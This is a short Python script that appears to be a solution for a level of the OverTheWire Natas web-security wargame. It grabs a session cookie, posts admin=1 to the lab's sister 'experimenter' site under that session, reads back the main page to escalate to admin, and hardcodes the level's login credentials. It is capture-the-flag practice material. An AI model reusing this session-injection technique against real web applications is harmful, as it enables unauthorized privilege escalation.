# Overthewire: Natas 22
# woanmeo11

import requests


url = 'http://natas21.natas.labs.overthewire.org/'
url_exp = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')
data = dict(
    admin = '1',
    submit = 'Update', 
)

r = requests.post(url, auth=auth)
cookies = dict(PHPSESSID = r.cookies['PHPSESSID'])

r = requests.post(url_exp, auth=auth, cookies=cookies, data=data)
r = requests.get(url, cookies=cookies, auth=auth)

print(r.text)
